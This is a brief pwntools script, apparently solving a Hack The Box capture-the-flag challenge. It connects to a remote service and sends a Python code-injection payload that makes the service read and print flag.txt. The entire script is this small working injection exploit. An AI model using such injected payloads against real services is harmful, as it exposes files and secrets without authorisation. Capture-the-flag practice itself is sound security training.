import os
from pwn import *

r = remote("target", 1337)
r.sendline("print(open('flag.txt','r').read())#")
flag = r.recvline_contains(b"HTB").strip().decode()[2:]
r.close()
print(flag)
